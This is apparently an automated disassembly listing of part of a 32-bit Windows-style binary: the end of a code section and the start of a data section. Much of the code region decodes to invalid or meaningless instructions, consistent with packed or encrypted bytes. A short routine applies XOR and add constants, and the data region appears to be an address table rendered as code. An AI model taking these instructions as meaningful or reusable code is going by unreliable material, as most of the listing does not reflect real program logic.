  411abc:	in     al,dx
  411abd:	std    
  411abe:	push   edx
  411abf:	mov    ds:0x6deb2924,eax
  411ac4:	mov    ecx,0x587aa320
  411ac9:	mov    eax,0xc35cb080
  411ace:	mov    edi,0x7d736d8e
  411ad3:	adc    bh,dl
  411ad5:	fsubr  st,st(2)
  411ad7:	push   ebx
  411ad8:	adc    DWORD PTR [esi],ebp
  411ada:	aas    
  411adb:	int3   
  411adc:	mov    dl,0xd
  411ade:	or     esi,DWORD PTR [ebx+0x43]
  411ae1:	mov    ds:0xc30a42ad,eax
  411ae7:	leave  
  411ae8:	mov    eax,0x7906f57a
  411aed:	mov    edi,0x4adf006d
  411af2:	or     bl,bl
  411af4:	mov    cl,0x3d
  411af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411af7:	add    BYTE PTR [esi+0x3c5f24a4],cl
  411afd:	pop    dx
  411aff:	dec    ecx
  411b00:	js     0x411a85
  411b02:	scas   al,BYTE PTR es:[edi]
  411b03:	iret   
  411b04:	inc    DWORD PTR [ecx+0x1c73e501]
  411b0a:	stos   DWORD PTR es:[edi],eax
  411b0b:	std    
  411b0c:	mov    ebp,0x34e2a478
  411b11:	hlt    
  411b12:	hlt    
  411b13:	sub    eax,0x961a5b66
  411b18:	ja     0x411b2a
  411b1a:	add    BYTE PTR [eax+0x3777b253],ah
  411b20:	inc    edx
  411b21:	shl    DWORD PTR [edi+edx*1-0x3f3b76d8],cl
  411b28:	mov    ecx,0x4a4cf5c0
  411b2d:	or     DWORD PTR [esi],eax
  411b2f:	add    DWORD PTR [ebx+0xa],ebx
  411b32:	(bad)  
  411b34:	aas    
  411b35:	ss gs push es
  411b38:	jne    0x411b4a
  411b3a:	outs   dx,DWORD PTR ds:[esi]
  411b3b:	out    0x4a,al
  411b3d:	xor    BYTE PTR [esi-0x2b7d8ee5],0x18
  411b44:	jle    0x411b6b
  411b46:	aad    0x62
  411b48:	pop    ecx
  411b49:	aas    
  411b4a:	sbb    al,0x86
  411b4c:	in     eax,dx
  411b4d:	call   0x3bb9:0xbfb81ca8
  411b54:	jmp    0xb06f:0x8333483d
  411b5b:	test   BYTE PTR [ecx+0x57941bd8],bl
  411b61:	mov    ah,0x95
  411b63:	ret    0xd746
  411b66:	cmc    
  411b67:	adc    ch,BYTE PTR [ecx+eax*8-0x1c33ef0]
  411b6e:	stos   DWORD PTR es:[edi],eax
  411b6f:	jmp    0xb571bf90
  411b74:	mov    al,ds:0x1a46aadb
  411b79:	cs inc edx
  411b7b:	int3   
  411b7c:	or     DWORD PTR [ecx],ebx
  411b7e:	sbb    eax,DWORD PTR [esi+0x5a]
  411b81:	fist   WORD PTR [ebp+0x500f27cd]
  411b87:	sti    
  411b88:	in     al,dx
  411b89:	shl    ebp,1
  411b8b:	mov    edi,0x20f6531d
  411b90:	inc    esi
  411b91:	or     esp,esp
  411b93:	pop    ebx
  411b94:	ins    DWORD PTR es:[edi],dx
  411b95:	pushf  
  411b96:	enter  0xc443,0xee
  411b9a:	outs   dx,BYTE PTR ds:[esi]
  411b9b:	pop    edi
  411b9c:	mov    ebx,0x18a32689
  411ba1:	jae    0x411be3
  411ba3:	mov    dh,0x76
  411ba5:	dec    esi
  411ba6:	push   ebp
  411ba7:	in     al,0x73
  411ba9:	rcl    DWORD PTR [ecx],1
  411bab:	fdiv   DWORD PTR [eax-0x15]
  411bae:	push   ebx
  411baf:	xor    DWORD PTR [ebx+0x6e0c6530],edi
  411bb5:	dec    esp
  411bb6:	push   0x22
  411bb8:	pop    ebx
  411bb9:	dec    ebx
  411bba:	(bad)  
  411bbb:	xchg   ebx,eax
  411bbc:	jae    0x411b78
  411bbe:	sub    al,0xc7
  411bc0:	fisub  WORD PTR [edi+0x573fbe09]
  411bc6:	add    ecx,DWORD PTR [edi-0x13a4e2fc]
  411bcc:	enter  0xfff7,0x6a
  411bd0:	mov    edi,0xc5fa32bd
  411bd5:	cdq    
  411bd6:	retf   
  411bd7:	inc    ebx
  411bd8:	mov    edi,0x7eb24667
  411bdd:	imul   eax,DWORD PTR [ebp-0x456a6c59],0x7f
  411be4:	add    esp,esi
  411be6:	test   eax,0x72900659
  411beb:	arpl   WORD PTR [edx],cx
  411bed:	push   ecx
  411bee:	sub    cl,BYTE PTR [eax+0x6a9b8178]
  411bf4:	inc    ebx
  411bf5:	(bad)  
  411bf6:	cmc    
  411bf7:	dec    ebx
  411bf8:	loope  0x411c58
  411bfa:	sbb    BYTE PTR ds:0x4283fc0b,cl
  411c00:	xchg   esi,eax
  411c01:	mov    esp,0x8375869e
  411c06:	xchg   edi,eax
  411c07:	dec    edx
  411c08:	int3   
  411c09:	fs retf 0x9cc8
  411c0d:	mov    ebx,0x88fe0146
  411c12:	sbb    al,0x43
  411c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c15:	dec    ebx
  411c16:	mul    DWORD PTR [edi-0x15]
  411c19:	adc    esi,DWORD PTR [ecx+0x3a]
  411c1c:	sahf   
  411c1d:	jle    0x411c80
  411c1f:	and    ecx,DWORD PTR [ebx+ebx*4+0x2581e614]
  411c26:	test   al,0x9a
  411c28:	push   ecx
  411c29:	jmp    0xc61f:0xe98375d8
  411c30:	dec    esi
  411c31:	fnstsw WORD PTR [edx]
  411c33:	scas   al,BYTE PTR es:[edi]
  411c34:	sub    eax,0x37ce1d3
  411c39:	mov    bl,ch
  411c3b:	jno    0x411c70
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x89dad6c4
  411c5b:	lea    ecx,[ebx]
  411c5d:	push   edx
  411c5e:	(bad)  
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	or     BYTE PTR [edx-0x777daf7d],al
  411c6c:	jg     0x411bfb
  411c6e:	pop    esp
  411c6f:	pop    esp
  411c70:	rcr    BYTE PTR [ebx],cl
  411c72:	retf   
  411c73:	ins    BYTE PTR es:[edi],dx
  411c74:	es call 0xc062:0xd0f4baef
  411c7c:	sbb    DWORD PTR [ebx],ecx
  411c7e:	(bad)  
  411c7f:	and    al,0xd
  411c81:	out    dx,eax
  411c82:	jbe    0x411cd7
  411c84:	test   BYTE PTR [edx],bl
  411c86:	cmp    al,0x2
  411c88:	jle    0x411c22
  411c8a:	daa    
  411c8b:	loop   0x411c99
  411c8d:	dec    esi
  411c8e:	es popa 
  411c90:	fnstenv [ebx+eiz*8-0x57]
  411c94:	xor    eax,0x960d44cb
  411c99:	retf   
  411c9a:	aam    0xb7
  411c9c:	pop    edi
  411c9d:	push   edx
  411c9e:	add    eax,DWORD PTR [esi-0x42429cd7]
  411ca4:	ss xchg ebx,eax
  411ca6:	jle    0x411ca1
  411ca8:	pushf  
  411ca9:	inc    eax
  411caa:	js     0x411c93
  411cac:	push   es
  411cad:	pop    es
  411cae:	(bad)  
  411caf:	adc    BYTE PTR [ecx],cl
  411cb1:	int3   
  411cb2:	in     eax,0x7a
  411cb4:	mov    cs,WORD PTR es:[edx+0x4b66ad9f]
  411cbb:	ins    BYTE PTR es:[edi],dx
  411cbc:	ret    0xbcd5
  411cbf:	add    bl,BYTE PTR [eax+0x42]
  411cc2:	hlt    
  411cc3:	stos   BYTE PTR es:[edi],al
  411cc4:	xchg   edi,eax
  411cc5:	aaa    
  411cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cc7:	sbb    al,0x79
  411cc9:	mul    BYTE PTR [esi+0x3]
  411ccc:	mul    dh
  411cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ccf:	scas   eax,DWORD PTR es:[edi]
  411cd0:	pop    edi
  411cd1:	repnz fmul QWORD PTR [esi]
  411cd4:	pop    ds
  411cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cd6:	fcomp  DWORD PTR [ecx]
  411cd8:	xor    cl,bl
  411cda:	dec    esp
  411cdb:	ror    BYTE PTR [ebx+0x5],1
  411cde:	mov    ch,dh
  411ce0:	repnz retf 
  411ce2:	fdivrp st(7),st
  411ce4:	fstp   TBYTE PTR [esp+ebx*4+0x73]
  411ce8:	mov    bl,BYTE PTR [ebx]
  411cea:	in     al,0x1f
  411cec:	cmp    DWORD PTR [eax-0x48d12950],0xffffffbc
  411cf3:	shl    BYTE PTR [ebx+0x3d],0x2a
  411cf7:	retf   0x7ec8
  411cfa:	or     al,0x2a
  411cfc:	lds    esi,FWORD PTR [eax+0x4a46e1f6]
  411d02:	xor    eax,0xacd536ab
  411d07:	pop    eax
  411d08:	pop    ebx
  411d09:	push   0xffffffd6
  411d0b:	es hlt 
  411d0d:	adc    dl,dh
  411d0f:	ficom  WORD PTR [eax]
  411d11:	popf   
  411d12:	ficom  DWORD PTR [edi-0x42479306]
  411d18:	(bad)  
  411d19:	(bad)  
  411d1a:	adc    ecx,DWORD PTR [edx+edx*2+0x34]
  411d1e:	xchg   ebp,eax
  411d1f:	nop
  411d20:	mov    DWORD PTR [edi-0x17bf4689],ebx
  411d26:	(bad)  
  411d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d28:	and    eax,0x3b75da4c
  411d2d:	in     eax,0xf
  411d2f:	jge    0x411cf4
  411d31:	lods   al,BYTE PTR ds:[esi]
  411d32:	xchg   esp,eax
  411d33:	std    
  411d34:	sahf   
  411d35:	or     cl,BYTE PTR [ebp-0x294dd10]
  411d3b:	jno    0x411db4
  411d3d:	sar    BYTE PTR [ecx+ebp*2-0x6d],0x5d
  411d42:	dec    ebx
  411d43:	mov    ecx,0xeffb6314
  411d48:	adc    bl,0x41
  411d4b:	xchg   BYTE PTR [eax-0x3b],cl
  411d4e:	jbe    0x411cf5
  411d50:	aad    0x86
  411d52:	cmp    al,0xf2
  411d54:	jle    0x411d81
  411d56:	pusha  
  411d57:	lods   al,BYTE PTR ds:[esi]
  411d58:	add    ebx,esi
  411d5a:	repnz test DWORD PTR [ebx-0x6cc63459],esp
  411d61:	pop    esi
  411d62:	imul   edi,DWORD PTR [ebp-0x69d1262e],0xa0c1dfbf
  411d6c:	mov    esi,0x76fbd182
  411d71:	mov    esp,0x729f50ff
  411d76:	and    al,0x44
  411d78:	out    dx,eax
  411d79:	jae    0x411d7e
  411d7b:	and    eax,0xd7eecde2
  411d80:	or     BYTE PTR [edx+0x4ad3d20a],bl
  411d86:	or     BYTE PTR [esi],0xc0
  411d89:	xchg   eax,esi
  411d8b:	int3   
  411d8c:	outs   dx,DWORD PTR ds:[esi]
  411d8d:	jbe    0x411d26
  411d8f:	or     edx,DWORD PTR [ecx]
  411d91:	mov    ah,0x18
  411d93:	cmp    BYTE PTR [eax+0x4a],0xd8
  411d97:	pop    edx
  411d98:	sub    eax,0x6b731ee7
  411d9d:	mov    eax,0x58f1b7ac
  411da2:	int3   
  411da3:	mov    al,ds:0x5e62f1c0
  411da8:	mov    al,ds:0x8449b83b
  411dad:	xor    al,0xc8
  411daf:	mov    dh,0x8d
  411db1:	jg     0x411da0
  411db3:	in     eax,dx
  411db4:	or     esi,0xb40dc33b
  411dba:	jmp    0x411dec
  411dbc:	adc    eax,0xb27566e6
  411dc1:	add    ebp,esp
  411dc3:	enter  0xae09,0x2
  411dc7:	fs pusha 
  411dc9:	and    cl,BYTE PTR [esi+0x22233541]
  411dcf:	add    dh,BYTE PTR gs:[edx]
  411dd2:	cmp    BYTE PTR [edi],dh
  411dd4:	ret    
  411dd5:	jge    0x411e30
  411dd7:	push   edx
  411dd8:	pop    ds
  411dd9:	(bad)  
  411dda:	stc    
  411ddb:	nop
  411ddc:	xor    DWORD PTR [ecx],0xffffff8f
  411ddf:	shl    DWORD PTR [edi-0x73],1
  411de2:	xor    al,0xd7
  411de4:	test   BYTE PTR ds:0x876a0048,al
  411dea:	mov    dl,0x69
  411dec:	jmp    0x411e2a
  411dee:	jno    0x411d78
  411df0:	sbb    eax,DWORD PTR [eax+0x39813084]
  411df6:	out    0x55,eax
  411df8:	idiv   BYTE PTR ss:[edx]
  411dfb:	ins    DWORD PTR es:[edi],dx
  411dfc:	fist   DWORD PTR [ebx-0x542d847b]
  411e02:	push   0x5cd36c6a
  411e07:	popa   
  411e08:	retf   
  411e09:	xor    ecx,DWORD PTR [ebx]
  411e0b:	cmp    al,0x63
  411e0d:	sub    edi,DWORD PTR [ecx+0x20]
  411e10:	jl     0x411db0
  411e12:	mov    edi,ebp
  411e14:	jle    0x411e33
  411e16:	adc    dl,BYTE PTR [ecx-0x62908247]
  411e1c:	dec    edi
  411e1d:	repnz cmp BYTE PTR [esi-0x413161aa],0xb4
  411e25:	ins    DWORD PTR es:[edi],dx
  411e26:	sbb    ax,0xa397
  411e2a:	jmp    0x61b93397
  411e2f:	sub    BYTE PTR ds:[ebp-0x2c],dh
  411e33:	sbb    eax,0xfbff58f9
  411e38:	fbstp  TBYTE PTR [ebx+edx*4+0x27]
  411e3c:	int3   
  411e3d:	push   ecx
  411e3e:	and    eax,0x6e105ac9
  411e43:	cli    
  411e44:	(bad)  
  411e45:	jg     0x411df6
  411e47:	and    DWORD PTR [esi+0x2d],ebx
  411e4a:	mov    esp,0x37235d36
  411e4f:	ret    0x4381
  411e52:	out    0x13,al
  411e54:	sbb    bl,BYTE PTR [ebx+edx*8-0x46]
  411e58:	lods   eax,DWORD PTR ds:[esi]
  411e59:	call   0xc837:0x82f91e9c
  411e60:	pop    ecx
  411e61:	cmp    BYTE PTR [eax-0x504e2681],al
  411e67:	xchg   esi,eax
  411e68:	sahf   
  411e69:	shl    BYTE PTR [edx],cl
  411e6b:	loop   0x411e69
  411e6d:	dec    ebp
  411e6e:	add    esp,DWORD PTR [esi]
  411e70:	adc    al,0xca
  411e72:	xor    eax,0x1a051f4a
  411e77:	sub    cl,0xce
  411e7a:	cmp    DWORD PTR [eax-0x3ac7527],edi
  411e80:	cmp    eax,0x39ca372b
  411e85:	inc    esi
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
